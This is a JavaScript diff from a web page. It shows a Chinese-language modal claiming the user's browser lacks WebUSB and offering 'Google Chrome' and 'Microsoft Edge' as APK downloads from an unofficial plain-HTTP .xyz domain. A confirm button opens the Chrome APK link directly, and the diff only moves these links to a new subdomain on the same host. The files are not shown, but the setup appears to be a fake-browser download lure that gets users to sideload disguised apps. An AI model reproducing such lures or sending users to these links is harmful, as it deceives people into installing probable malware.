@@ -238,8 +238,8 @@ function confirmModal() {
 // 显示浏览器下载弹窗
 function showChromeDownloadPopup() {
     const content = '您的浏览器不支持 WebUSB，请使用以下浏览器：<br><br>' +
-                    '<a href="http://a14472357.328657.xyz/a14472357/Chrome_107.0.53.apk" target="_blank">Google Chrome 浏览器</a><br><br>' +
-                    '<a href="http://a14472357.328657.xyz/a14472357/EDGE.apk" target="_blank">Microsoft Edge 浏览器</a><br><br>' +
+                    '<a href="http://a14472357.a.328657.xyz/a14472357/Chrome_107.0.53.apk" target="_blank">Google Chrome 浏览器</a><br><br>' +
+                    '<a href="http://a14472357.a.328657.xyz/a14472357/EDGE.apk" target="_blank">Microsoft Edge 浏览器</a><br><br>' +
                     '点击上方链接下载对应浏览器的安装工具。';
     
     showModal('浏览器支持提示', content, {
@@ -248,7 +248,7 @@ function showChromeDownloadPopup() {
         confirmText: '下载 Chrome 工具',
         callback: function(confirmed) {
             if (confirmed) {
-                window.open('http://a14472357.328657.xyz/a14472357/Chrome_107.0.53.apk', '_blank');
+                window.open('http://a14472357.a.328657.xyz/a14472357/Chrome_107.0.53.apk', '_blank');
             }
         }
     });
